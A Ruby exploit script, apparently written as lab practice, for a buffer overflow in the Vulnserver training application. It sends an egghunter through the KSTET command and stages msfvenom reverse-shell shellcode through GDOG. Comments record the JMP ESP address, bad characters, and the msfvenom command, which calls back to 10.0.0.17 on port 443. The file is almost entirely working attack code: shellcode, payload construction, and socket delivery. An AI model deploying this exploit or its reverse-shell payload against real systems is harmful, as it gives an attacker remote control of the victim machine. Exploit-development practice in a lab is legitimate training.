#!/usr/bin/ruby
#encoding: ascii

require"socket"
ip = "10.0.0.9"
port = 9999

egghunter = ["6681caff0f42526a0258cd2e3c055a74efb86567677989d7af75eaaf75e7ffe7"].pack("H*")
payload = ""
#payload << "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
#badchar = 00 and only 94 bytes got copied to stack, the rest not in process memory??
#payload << "A"*4964
payload << egghunter			#egghunter
payload << "A"*(70 - egghunter.bytesize)
#payload << ["deadbeef"].pack("H*")	#got EIP
payload << [0x625011AF].pack("L")	#jmp ESP
#!mona modules says vulnserver.exe and essfunc.dll has no rebase, aslr, or NX so good to go :)
#essefunc.dll
#625011AF   FFE4             		JMP ESP
#payload << "\xcc"*500
#nasm > jmp short -75
#00000000  EBB3              jmp short 0xffffffb5
payload << "\x90\x90\xeb\xb3"			#nop; nop; jmp back to egghunter at top of stack	

egg = "eggyeggy"
#egg << "\xcc"*400
#egg << "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
#badchar = 00
shell =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" + 
"\xb8\x8c\x70\xbc\x41\xdb\xd3\xd9\x74\x24\xf4\x5d\x2b\xc9" +
"\xb1\x52\x31\x45\x12\x03\x45\x12\x83\x49\x74\x5e\xb4\xad" +
"\x9d\x1c\x37\x4d\x5e\x41\xb1\xa8\x6f\x41\xa5\xb9\xc0\x71" +
"\xad\xef\xec\xfa\xe3\x1b\x66\x8e\x2b\x2c\xcf\x25\x0a\x03" +
"\xd0\x16\x6e\x02\x52\x65\xa3\xe4\x6b\xa6\xb6\xe5\xac\xdb" +
"\x3b\xb7\x65\x97\xee\x27\x01\xed\x32\xcc\x59\xe3\x32\x31" +
"\x29\x02\x12\xe4\x21\x5d\xb4\x07\xe5\xd5\xfd\x1f\xea\xd0" +
"\xb4\x94\xd8\xaf\x46\x7c\x11\x4f\xe4\x41\x9d\xa2\xf4\x86" +
"\x1a\x5d\x83\xfe\x58\xe0\x94\xc5\x23\x3e\x10\xdd\x84\xb5" +
"\x82\x39\x34\x19\x54\xca\x3a\xd6\x12\x94\x5e\xe9\xf7\xaf" +
"\x5b\x62\xf6\x7f\xea\x30\xdd\x5b\xb6\xe3\x7c\xfa\x12\x45" +
"\x80\x1c\xfd\x3a\x24\x57\x10\x2e\x55\x3a\x7d\x83\x54\xc4" +
"\x7d\x8b\xef\xb7\x4f\x14\x44\x5f\xfc\xdd\x42\x98\x03\xf4" +
"\x33\x36\xfa\xf7\x43\x1f\x39\xa3\x13\x37\xe8\xcc\xff\xc7" +
"\x15\x19\xaf\x97\xb9\xf2\x10\x47\x7a\xa3\xf8\x8d\x75\x9c" +
"\x19\xae\x5f\xb5\xb0\x55\x08\xb0\x44\x55\xd9\xac\x46\x55" +
"\xd8\x97\xce\xb3\xb0\xf7\x86\x6c\x2d\x61\x83\xe6\xcc\x6e" +
"\x19\x83\xcf\xe5\xae\x74\x81\x0d\xda\x66\x76\xfe\x91\xd4" +
"\xd1\x01\x0c\x70\xbd\x90\xcb\x80\xc8\x88\x43\xd7\x9d\x7f" +
"\x9a\xbd\x33\xd9\x34\xa3\xc9\xbf\x7f\x67\x16\x7c\x81\x66" +
"\xdb\x38\xa5\x78\x25\xc0\xe1\x2c\xf9\x97\xbf\x9a\xbf\x41" +
"\x0e\x74\x16\x3d\xd8\x10\xef\x0d\xdb\x66\xf0\x5b\xad\x86" +
"\x41\x32\xe8\xb9\x6e\xd2\xfc\xc2\x92\x42\x02\x19\x17\x62" +
"\xe1\x8b\x62\x0b\xbc\x5e\xcf\x56\x3f\xb5\x0c\x6f\xbc\x3f" +
"\xed\x94\xdc\x4a\xe8\xd1\x5a\xa7\x80\x4a\x0f\xc7\x37\x6a" +
"\x1a"
egg << shell

TCPSocket.open(ip, port) do |s|
  puts s.gets
  #s.print "STATS #{egg}"		#only store bout 100 bytes
  					#same as RTIME, LTIME, SRUN
					#TRUN, GMON just dont store it
  s.print "GDOG #{egg}"			#GDOD stores all of it, :)
  sleep(1)				#exploit seems more reliable with small wait
  s.print "KSTET #{payload}"		#only accepts 94 bytes then cut off, bad char 00
end

#root@kali:~/Desktop# msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=10.0.0.17 EXITFUNC=thread -b "\x00" -f hex
#Payload size: 351 bytes
#Final size of hex file: 702 bytes
#dbdabdb12f134ad97424f4582bc9b1523168170368178359d3f1bf65c4743f951519c9702419adf117a9a5579442eb432f262464988d124b19bd67ca99bcbb2ca30ece2de473237fbdf8966fcab52a0480582bf9515a1aacea05bc4f3e3ef557237b4fec97f74e24e6f8fd09c60aff4ee1f48aa611888c7d6b561865cb1dba41edf25d02e1bf2a4ce63efee712ca0127938825e3ff4b47b2a53a78a405e2dcafa8f76cf2a4345d0c3553d67f07fc4c172b754be04cac2b7eb34f4c57701b1ccf5124f70f5df1585ff1aa180fb11af1453e44e16694ed889d7f184d9d6e744f9d913fc67bfb2f8fd494d68aae051601cb069ca62cc855c23ebd95991c68a93708f638dcc871214b9fd6978275cb8e3c6b1656062fcdab89ae8090ada05c18ea94304fa442f739063ca196c0a834d5d2ae3830a54e88edf071257af50a5b1afac1df3a19c315d3848697be367ddbc6b477a43ca4f2a17962efdb12070f4f1202

#root@kali:~/Desktop/vulnserver# msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=10.0.0.17 EXITFUNC=thread -b "\x00" -v shell -f ruby
#Payload size: 351 bytes